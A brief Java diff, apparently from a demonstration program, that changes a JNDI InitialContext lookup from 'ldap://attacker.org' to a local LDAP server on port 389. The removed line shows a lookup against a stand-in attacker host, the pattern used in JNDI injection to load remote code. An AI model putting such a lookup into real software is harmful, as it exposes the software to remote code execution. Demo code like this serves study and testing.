@@ -25,7 +25,7 @@ public class Main {
         System.out.println("About to try JNDI lookup!");
         try {
             Context ctx = new InitialContext();
-            String datasource = "ldap://attacker.org";
+            String datasource = "ldap://localhost:389";
             ctx.lookup(datasource);
 
             // Happens on normal circumstances...
